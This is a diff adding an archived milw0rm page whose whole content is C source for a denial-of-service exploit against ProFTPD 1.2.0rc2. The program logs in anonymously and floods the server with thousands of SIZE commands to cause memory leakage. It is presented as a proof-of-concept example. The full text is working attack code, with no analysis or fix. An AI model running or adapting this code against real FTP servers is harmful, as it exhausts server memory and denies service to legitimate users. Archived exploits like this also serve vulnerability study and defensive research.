@@ -1,0 +1,139 @@
+<html>
+<head>
+<title>ProFTPD 1.2.0(rc2) (memory leakage example) Exploit</title>
+<pre>
+/*
+ | Proftpd DoS
+ | by Piotr Zurawski (szur@ix.renet.pl)
+ | This source is just an example of memory leakage in proftpd-1.2.0(rc2)
+ | server discovered by Wojciech Purczynski.
+ |
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;time.h&gt;
+#include &lt;string.h&gt;
+#include &lt;ctype.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;arpa/nameser.h&gt;
+#include &lt;netdb.h&gt;
+
+#define USERNAME &quot;anonymous&quot;
+#define PASSWORD &quot;dupa@dupa.pl&quot;
+#define HOWMANY 10000
+
+void logintoftp();
+void sendsizes();
+int fd;
+struct in_addr host;
+unsigned short port = 21;
+int tcp_connect(struct in_addr addr,unsigned short port);
+
+int main(int argc, char **argv)
+{
+  if (!resolve(argv[1],&amp;host))
+  {
+    fprintf(stderr,&quot;Hostname lookup failure\n&quot;);
+    exit(0);
+  }
+
+  fd=tcp_connect(host,port);
+  logintoftp(fd);
+  printf(&quot;Logged\n&quot;);
+  sendsizes(fd);
+
+  printf(&quot;Now check out memory usage of proftpd daemon&quot;);
+  printf(&quot;Resident set size (RSS) and virtual memory size (VSIZE)&quot;);
+  printf(&quot;fields in ps output&quot;);
+}
+
+void logintoftp()
+{
+  char snd[1024], rcv[1024];
+  int n;
+
+  printf(&quot;Logging &quot; USERNAME  &quot;/&quot;  PASSWORD &quot;\r\n&quot;);
+
+  memset(snd, '\0', 1024);
+  sprintf(snd, &quot;USER %s\r\n&quot;, USERNAME);
+  write(fd, snd, strlen(snd));
+
+  while((n=read(fd, rcv, sizeof(rcv))) &gt; 0)
+  {
+    rcv[n] = 0;
+    if(strchr(rcv, '\n') != NULL)break;
+  }
+
+  memset(snd, '\0', 1024);
+  sprintf(snd, &quot;PASS %s\r\n&quot;, PASSWORD);
+  write(fd, snd, strlen(snd));
+
+  while((n=read(fd, rcv, sizeof(rcv))) &gt; 0)
+  {
+    rcv[n] = 0;
+    if(strchr(rcv, '\n') != NULL)
+      break;
+  }
+  return;
+}
+
+void sendsizes()
+{
+  char snd[1024], rcv[1024];
+  unsigned long loop;
+
+  printf (&quot;Sending %i size commands... \n&quot;, HOWMANY);
+
+  for(loop=0;loop&lt;HOWMANY;loop++)
+  {
+    sprintf(snd, &quot;SIZE /dadasjasojdasj/adhjaodhahasohasaoihroaha\n&quot;);
+    write(fd, snd, strlen(snd));
+  }
+  return;
+}
+
+int tcp_connect(struct in_addr addr,unsigned short port)
+{
+  int fd;
+
+  struct sockaddr_in serv;
+  bzero(&amp;serv,sizeof(serv)); serv.sin_addr=addr;
+  serv.sin_port=htons(port);
+  serv.sin_family=AF_INET;
+
+  if ((fd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) &lt; 0)\
+  {
+    perror(&quot;socket&quot;);
+    exit(0);
+  }
+
+  if (connect(fd,(struct sockaddr *)&amp;serv,sizeof(serv)) &lt; 0)
+  {
+    perror(&quot;connect&quot;);
+    exit(0);
+  }
+
+  return(fd);
+}
+
+int resolve(char *hostname,struct in_addr *addr)
+{
+  struct hostent *res;
+  res=gethostbyname(hostname);
+  if (res==NULL)
+    return(0);
+  memcpy((char *)addr,res-&gt;h_addr,res-&gt;h_length);
+  return(1);
+}
+
+
+// milw0rm.com [2001-01-03]
+</pre>
+</html>
+
